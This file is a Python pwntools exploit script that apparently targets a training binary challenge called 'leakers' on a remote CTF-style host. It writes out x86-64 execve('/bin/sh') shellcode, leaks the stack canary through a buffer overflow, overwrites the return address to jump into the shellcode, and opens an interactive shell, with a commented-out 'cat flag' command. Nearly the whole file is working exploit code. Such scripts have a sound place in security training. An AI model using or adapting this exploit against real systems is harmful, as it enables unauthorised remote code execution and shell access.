from pwn import *

run_local = False
verbose = True

print("-----------------EXECUTION---------------------------------------")

# ----------------------EXECUTION-------------------------------------------

BUF_SIZE = 104
# BUF_ADDR = 0x7fffffffdda0
PS1_ADDR = 0x00404080

if run_local:
    s = ssh(host='localhost', user='acidburn', port=2222)
    p = s.process('./leakers')

    pid = gdb.attach(p)
else:
    p = remote("bin.training.jinblack.it", 2010)

input("Wait GDB to load and press ENTER")

print(p.recvline_endswith(b"!"))

input("SEND SHELLCODE INSIDE NAME")
shellcode = b'\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\xEB\x03\x5F\x0F\x05\xE8\xF8\xFF\xFF\xFF/bin/sh\x00'
p.sendline(shellcode)  # test\n

sleep(0.5)

# here read the canary and then compare
input("SEND EMPTY BUFFER")
buffer = b"A"*BUF_SIZE + b'S'
p.send(buffer)  # LINE

ret = p.recv_raw(150)

# input("PRINT THE LEAK")
print("------------")
print(str(ret))

print("------------")

canary_location_offset = ret.find(b'S')+1
canary = b'\x00' + ret[canary_location_offset:canary_location_offset+7]

# with open('canary.dat', 'wb') as f:
#     f.write(canary)
# print("Canary saved")
# f.close()

# input("Rebuild canary")
# buffer = b"B"*104 + canary + 8 * b'C' + 8 * \
#     b'D' + 8 * b'E' + 8 * b'F' + 8 * b'H'
# p.send(buffer)  # LINE


# ------------------SHELLCODE CREATION-------------------------------------------------


# Internet shellcode
buffer = BUF_SIZE * b'\x90' + canary + p64(0x1) + p64(PS1_ADDR)

input("Send buffer with canary")
p.send(buffer)
# print(p.recvuntil(b"\xc0"))
# p.send(b"\n")
# print(p.recvuntil(b"Bye!"))

# # p.send(b"cat flag")

p.interactive()
